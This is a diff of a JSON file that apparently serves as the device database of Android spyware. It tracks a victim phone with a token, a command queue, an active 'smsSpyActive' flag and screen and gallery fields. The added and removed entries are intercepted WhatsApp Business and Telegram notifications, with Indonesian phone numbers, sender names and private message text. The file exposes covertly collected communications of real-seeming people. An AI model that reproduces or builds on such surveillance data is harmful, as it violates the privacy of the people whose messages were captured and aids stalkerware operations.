@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632864337,
+    "lastSeen": 1775632870353,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,54 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎5 pesan dari 2 chat",
+        "time": "08/04 14:21",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632872055
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "dataa gw sekarat",
+        "time": "08/04 14:21",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632871971
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎5 pesan dari 2 chat",
+        "time": "08/04 14:21",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632868041
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "P",
+        "time": "08/04 14:21",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632868034
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎4 pesan dari 2 chat",
+        "time": "08/04 14:21",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632867568
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "P",
+        "time": "08/04 14:21",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775632867476
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
@@ -4278,54 +4326,6 @@
         "time": "08/04 13:53",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775631220089
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Bukan tema bug",
-        "time": "08/04 13:53",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775631215047
-      },
-      {
-        "appName": "WA Business",
-        "sender": "WA Business",
-        "content": "‎‎2 pesan dari 2 chat",
-        "time": "08/04 13:53",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631204997
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "P",
-        "time": "08/04 13:53",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631204900
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 851-2302-5715",
-        "content": "10/10🗿🙏",
-        "time": "08/04 13:53",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631203453
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 851-2302-5715",
-        "content": "10/10🗿🙏",
-        "time": "08/04 13:53",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631203427
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 851-2302-5715",
-        "content": "Astaghfirullah 🗿🗿🙏",
-        "time": "08/04 13:53",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775631192578
       }
     ],
     "galleryPhotos": [],
